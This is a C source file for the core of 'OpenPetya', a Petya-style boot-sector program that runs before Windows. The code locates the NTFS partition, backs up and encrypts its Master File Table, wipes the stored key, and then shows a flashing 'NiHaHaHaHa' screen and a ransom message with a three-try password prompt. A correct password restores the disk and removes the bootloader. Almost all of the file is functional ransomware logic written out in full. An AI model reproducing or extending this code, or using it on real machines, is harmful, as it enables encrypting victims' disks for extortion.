// bootloader.c
// Standard libraries are not available, so they have to be purely implemented

#include "bootloader.h"
#include "io.h"
#include "keyboard.h"
#include "types.h"
#include "utils.h"
#include "ata.h"
#include "state.h"
#include "ntfs_crypt.h"
#include "hidden_store.h"
#include "password_store.h"
#include "petya.h"

#define MAX_ATTEMPTS 3
#define MAX_PW_LEN 32

#define VGA_BASE ((volatile uint16_t *)0xB8000)
#define VGA_COLS 80
#define VGA_ROWS 25

// Reference: https://grokipedia.com/page/BIOS_color_attributes
#define COLOR_WHITE_ON_BLACK    0x07
#define COLOR_GREEN_ON_BLACK    0x0A
#define COLOR_CYAN_ON_BLACK     0x0B
#define COLOR_YELLOW_ON_BLACK   0x0E
#define COLOR_WHITE_ON_BLUE     0x1F
#define COLOR_GRAY_ON_RED       0x49
#define COLOR_WHITE_ON_RED      0x4F
#define COLOR_RED_ON_BLACK      0x0C
#define COLOR_DARKRED_ON_BLACK  0x04

// Global variables
static int cursor_row = 0;
static int cursor_col = 0;
static uint8_t current_color = COLOR_WHITE_ON_BLACK;

/// @brief 
/// @param  
static void update_cursor(void)
{
    uint16_t pos = cursor_row * VGA_COLS + cursor_col;
    outb(0x3D4, 0x0F);
    outb(0x3D5, (uint8_t)(pos & 0xFF));
    outb(0x3D4, 0x0E);
    outb(0x3D5, (uint8_t)((pos >> 8) & 0xFF));
}

/// @brief 
/// @param  
static void scroll(void)
{
    volatile uint16_t *vga = VGA_BASE;

    for (int row = 0; row < VGA_ROWS - 1; row++)
        for (int col = 0; col < VGA_COLS; col++)
            vga[row * VGA_COLS + col] = vga[(row + 1) * VGA_COLS + col];

    uint16_t blank = ' ' | ((uint16_t)current_color << 8);
    for (int col = 0; col < VGA_COLS; col++)
        vga[(VGA_ROWS - 1) * VGA_COLS + col] = blank;
    cursor_row = VGA_ROWS - 1;
}

/// @brief Convert integer into ASCII code
/// @param n 
/// @param buf 
/// @param base 
static void itoa(uint32_t n, char *buf, int base)
{
    const char digits[] = "0123456789ABCDEF";
    char tmp[32];
    int i = 0;
    if (n == 0)
    {
        buf[0] = '0';
        buf[1] = '\0';
        return;
    }

    while (n > 0)
    {
        tmp[i++] = digits[n % base];
        n /= base;
    }

    int j = 0;
    while (i > 0)
        buf[j++] = tmp[--i];

    buf[j] = '\0';
}

/// @brief 
/// @param  
static void draw_line(void)
{
    for (int i = 0; i < VGA_COLS; i++)
        vga_putchar('-');
}

/// @brief 
/// @param out 
static void get_cpu_vendor(char *out) {
    uint32_t ebx, ecx, edx;

    __asm__ volatile (
        "cpuid"
        : "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0)
    );

    uint32_t *p = (uint32_t *)out;
    p[0] = ebx;
    p[1] = edx;
    p[2] = ecx;
    
    out[12] = '\0';
}

/// @brief Search the first NTFS LBA
/// @param  
/// @return 
static uint32_t find_ntfs_partition_lba(void)
{
    uint8_t mbr[512];
    if (ata_read(0, 1, mbr) != 0)
    {
        vga_puts("Cannot read MBR!\n");
        return 0;
    }

    // Check boot signature
    if (mbr[510] != 0x55 || mbr[511] != 0xAA)
    {
        vga_puts("Invalid MBR signature!\n");
        return 0;
    }

    // Scan partition table (4 entries at offset 0x1BE, 16 bytes each)
    uint32_t best_lba = 0;
    uint32_t best_size = 0;

    for (int i = 0; i < 4; i++)
    {
        uint8_t *entry = mbr + 0x1BE + i * 16;
        uint8_t  type  = entry[4];
        uint32_t lba   = entry[8]  | ((uint32_t)entry[9]  << 8) | ((uint32_t)entry[10] << 16) | ((uint32_t)entry[11] << 24);
        uint32_t size  = entry[12] | ((uint32_t)entry[13] << 8) | ((uint32_t)entry[14] << 16) | ((uint32_t)entry[15] << 24);

        if (type != 0x07)   // 0x07 = NTFS/exFAT
            continue;

        vga_puts("  Found NTFS partition: LBA=");
        vga_put_dec(lba);
        vga_puts(" size=");
        vga_put_dec(size);
        vga_putchar('\n');

        // Pick the largest NTFS partition (most likely to be Windows)
        if (size > best_size)
        {
            best_size = size;
            best_lba  = lba;
        }
    }

    if (best_lba == 0)
        vga_puts("No NTFS partition found!\n");
    else
    {
        vga_puts("Selected partition LBA=");
        vga_put_dec(best_lba);
        vga_putchar('\n');
    }

    return best_lba;
}

/// @brief 
/// @param  
void vga_clear(void)
{
    volatile uint16_t *vga = VGA_BASE;
    uint16_t blank = ' ' | (current_color << 8);
    for (int i = 0; i < VGA_COLS * VGA_ROWS; i++)
        vga[i] = blank;
    cursor_row = cursor_col = 0;
    update_cursor();
}

/// @brief 
/// @param c 
void vga_putchar(char c)
{
    volatile uint16_t *vga = VGA_BASE;

    if (c == '\b')
    {
        if (cursor_col > 0)
        {
            cursor_col--;
        }
        else if (cursor_row > 0)
        {
            cursor_row--;
            cursor_col = VGA_COLS - 1;
        }

        vga[cursor_row * VGA_COLS + cursor_col] = ' ' | ((uint16_t)current_color << 8);
        update_cursor();

        return;
    }
    else if (c == '\n')
    {
        cursor_col = 0;
        cursor_row++;
    }
    else if (c == '\r')
    {
        cursor_col = 0;
    }
    else if (c == '\t')
    {
        cursor_col = (cursor_col + 8) & ~7;
    }
    else
    {
        vga[cursor_row * VGA_COLS + cursor_col] = (uint8_t)c | ((uint16_t)current_color << 8);
        cursor_col++;
    }

    if (cursor_col >= VGA_COLS) {
        cursor_col = 0;
        cursor_row++;
    }

    if (cursor_row >= VGA_ROWS)
        scroll();

    update_cursor();
}

/// @brief 
/// @param s 
void vga_puts(const char *s)
{
    while (*s)
        vga_putchar(*s++);
}

/// @brief 
/// @param row 
/// @param col 
/// @param c 
void vga_putchar_at(int row, int col, char c)
{
    volatile uint16_t *vga = VGA_BASE;

    if (row < 0 || row >= VGA_ROWS)
        return;

    if (col < 0 || col >= VGA_COLS)
        return;

    vga[row * VGA_COLS + col] = (uint8_t)c | ((uint16_t)current_color << 8);
}

/// @brief 
/// @param art 
void vga_draw_centered_ascii(const char *art)
{
    int lines = 1;
    int max_width = 0;
    int current_width = 0;

    for (const char *p = art; *p; p++)
    {
        if (*p == '\n')
        {
            if (current_width > max_width)
                max_width = current_width;

            current_width = 0;
            lines++;
        }
        else
        {
            current_width++;
        }
    }

    if (current_width > max_width)
        max_width = current_width;

    int start_row = (VGA_ROWS - lines) / 2;

    int row = start_row;

    const char *line_start = art;

    while (*line_start)
    {
        int line_len = 0;

        while (line_start[line_len] && line_start[line_len] != '\n')
        {
            line_len++;
        }

        int start_col = (VGA_COLS - line_len) / 2;

        for (int i = 0; i < line_len; i++)
        {
            vga_putchar_at(row, start_col + i, line_start[i]);
        }

        row++;

        line_start += line_len;

        if (*line_start == '\n')
            line_start++;
    }
}

/// @brief Set VGA display color
/// @param color 
void vga_set_color(uint8_t color)
{
    current_color = color;
}

/// @brief Print integer in decimal representation
/// @param n Integer value
void vga_put_dec(uint32_t n)
{
    char buf[16];
    itoa(n, buf, 10);
    vga_puts(buf);
}

/// @brief Print integer in hexadecimal representation
/// @param n Integer value
void vga_put_hex(uint32_t n)
{
    char buf[16];
    vga_puts("0x");
    itoa(n, buf, 16);
    vga_puts(buf);
}

/// @brief Clear OpenPetya meta from disk.
/// @param  
void wipe_out_bootloader(void)
{
    uint8_t zero[512] = { 0 };

    vga_puts("Removing the bootloader...\n");

    for (int i = 1; i <= 16; i++)
        ata_write(i, 1, zero);

    // Wipe state/tag/salt (sector 60-62)
    ata_write(60, 1, zero);
    ata_write(61, 1, zero);
    ata_write(62, 1, zero);

    vga_puts("Done.\n");
}

/// @brief Do Salsa20 encryption and reboot
/// @param  
void do_encryption(void)
{
    vga_clear();

    vga_set_color(COLOR_WHITE_ON_BLUE);
    vga_puts("OpenPetya, 1st stage.");
    vga_set_color(COLOR_WHITE_ON_BLACK);
    vga_puts("\n\n");

    vga_set_color(COLOR_YELLOW_ON_BLACK);
    vga_puts("First boot detected. Setting up encryption...\n");
    vga_set_color(COLOR_WHITE_ON_BLACK);

    // Init hidden store with disk size from state sector
    uint64_t disk_size = state_read_disk_size();
    if (disk_size == 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: Disk size is not set by installer.\n");

        goto halt;
    }

    vga_puts("Detecting NTFS partition...\n");
    uint32_t partition_lba = find_ntfs_partition_lba();
    if (partition_lba == 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: No NTFS partition found!\n");

        goto halt;
    }

    hidden_store_init(disk_size);

    vga_puts("[1/4] Backing up MFT to hidden area...\n");
    if (hidden_backup_mft(partition_lba) != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: MFT backup failed!\n");

        goto halt;
    }

    vga_puts("[2/4] Generating salt...\n");
    if (ntfs_generate_salt() != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: Salt generation failed!\n");
        
        goto halt;
    }

    vga_puts("[3/4] Encrypting MFT...\n");
    char password[65];
    if (pwstore_read(password, sizeof(password)) != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("Error: No password in sector 59.\n");

        goto halt;
    }

    if (ntfs_mft_encrypt(password, partition_lba) != 0)
    {
        zero_buffer(password, sizeof(password));

        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: MFT encryption failed!\n");

        goto halt;
    }

    zero_buffer(password, sizeof(password));
    pwstore_erase();

    vga_puts("[4/4] Saving state...\n");
    if (state_write(STATE_ENCRYPTED) != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: State save failed!\n");

        goto halt;
    }

    uint8_t raw[512];
    ata_read(60, 1, raw);
    vga_puts("Final state check: magic=");
    vga_put_hex(*(uint32_t *)raw);
    vga_puts(" state=");
    vga_put_hex(raw[4]);
    vga_putchar('\n');

    vga_puts("Rebooting...\n");
    for (volatile uint32_t _i = 0; _i < 15000000; _i++);

    vga_set_color(COLOR_GREEN_ON_BLACK);
    vga_puts("\nSetup complete! Rebooting in 3 seconds...\n");
    
    for (volatile uint32_t _i = 0; _i < 15000000; _i++);

    do_reboot();

halt:
    vga_set_color(COLOR_RED_ON_BLACK);
    vga_puts("\nSetup failed. System halted.\n");
    vga_puts("Re-install the bootloader to try again.\n");

     __asm__ volatile ("cli\n.Lhalt1: hlt\njmp .Lhalt1\n");
    __builtin_unreachable();
}

/// @brief Login panel
/// @param  
void login(void)
{
    vga_clear();

    vga_set_color(COLOR_WHITE_ON_BLUE);
    vga_puts("OpenPetya");
    vga_puts("\n\n");

    vga_set_color(COLOR_WHITE_ON_BLACK);

    char input[MAX_PW_LEN];
    int attempts = 0;

    vga_puts("Detecting NTFS partition...\n");
    uint32_t partition_lba = find_ntfs_partition_lba();
    if (partition_lba == 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: No NTFS partition found!\n");

        goto halt;
    }

    // NiHaHaHaHa
    int flag = 0;
    while (1)
    {
        vga_clear();
        vga_set_color(flag == 0 ? COLOR_GRAY_ON_RED : COLOR_WHITE_ON_RED);

        flag = flag ? 0 : 1;

        vga_draw_centered_ascii("NiHaHaHaHa\n(Press any key to NiHaHaHaHa)");

        if (keyboard_hashkey())
            break;

        sleep(100);
    }

    keyboard_getchar();

    vga_set_color(COLOR_WHITE_ON_RED);
    vga_clear();
    vga_puts(RANSOM_MSG);
    vga_putchar('\n');

    // Enter your password
    while (attempts < MAX_ATTEMPTS)
    {
        vga_puts("Attempts remaining: ");
        vga_put_dec(MAX_ATTEMPTS - attempts);
        vga_putchar('\n');

        vga_puts("Password: ");
        keyboard_readline(input, MAX_PW_LEN);

        if (ntfs_mft_decrypt(input, partition_lba) == 0)
        {
            vga_set_color(COLOR_WHITE_ON_BLACK);
            vga_clear();

            zero_buffer(input, MAX_PW_LEN);

            vga_set_color(COLOR_GREEN_ON_BLACK);
            vga_puts("\nAccess granted!\n\n");
            vga_set_color(COLOR_WHITE_ON_BLACK);

            uint64_t disk_size = state_read_disk_size();
            hidden_store_init(disk_size);

            vga_puts("[1/4] Restoring original MFT...\n");
            if (hidden_restore_mft(partition_lba) != 0)
            {
                vga_set_color(COLOR_RED_ON_BLACK);
                vga_puts("ERROR: MFT restore failed!\n");
                vga_puts("System halted to prevent data loss.\n");

                goto halt;
            }

            vga_puts("[2/4] Restoring original MBR...\n");
            uint8_t mbr_buffer[512];
            if (ata_read(63, 1, mbr_buffer) == 0)
            {
                uint8_t current[512]; // current partition table
                ata_read(0, 1, current);

                for (int i = 0; i < 446; i++)
                    current[i] = mbr_buffer[i];

                current[510] = 0x55;
                current[511] = 0xAA;

                ata_write(0, 1, current);
                vga_puts("Original MBR was restored.\n");
            }
            else
            {
                vga_puts("Warning: Could not read MBR backup.\n");
            }

            vga_puts("[3/4] Removing custom bootloader...\n");
            wipe_out_bootloader();
            hidden_wipe();

            uint8_t zero[512] = { 0 };
            ata_write(63, 1, zero);

            vga_set_color(COLOR_GREEN_ON_BLACK);
            vga_puts("\n[4/4] Booting Windows...\n");
            vga_puts("Custom bootloader has been removed.\n");

            for (volatile uint32_t _i = 0; _i < 15000000; _i++);

            do_chainload();
        }

        zero_buffer(input, MAX_PW_LEN);
        vga_puts("Wrong pasword.\n\n");

        attempts++;
    }

halt:
    vga_puts("System halted.\n");
    __asm__ volatile ("cli\n.Lhalt_login: hlt\njmp .Lhalt_login\n");
    __builtin_unreachable();
}

/// @brief Main function of OpenPetya bootloader
/// @param boot_drive 
void bootloader_main(uint32_t boot_drive)
{
    vga_clear();
    ata_set_drive((uint8_t)boot_drive);

    if (ata_init() != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("FATAL: ATA initialization failed!\n");
        __asm__ volatile ("cli\n.Lhalt0: hlt\njmp .Lhalt0\n");
    }

    // Read and display raw state sector before deciding what to do
    uint8_t raw[512];
    if (ata_read(60, 1, raw) == 0)
    {
        vga_puts("State sector: magic=");
        vga_put_hex(*(uint32_t *)raw);
        vga_puts(" state=");
        vga_put_hex(raw[4]);
        vga_puts(" disk_sectors=");
        vga_put_dec(*(uint32_t *)(raw + 8));
        vga_putchar('\n');
    }
    else
    {
        vga_puts("State sector: READ FAILED\n");
    }

    vga_set_color(COLOR_WHITE_ON_BLACK);
    vga_puts("BSS end: ");
    vga_put_hex((uint32_t)&__bss_end);
    vga_putchar('\n');
    vga_puts("ESP: ");
    uint32_t esp_val;
    __asm__ volatile ("mov %%esp, %0" : "=r"(esp_val));
    vga_put_hex(esp_val);
    vga_putchar('\n');

    uint8_t s = state_read();
    vga_puts("state_read() returned: ");
    vga_put_hex(s);
    vga_putchar('\n');

    if (s == STATE_NOT_SETUP)
        do_encryption();
    else
        login();

    __builtin_unreachable();
}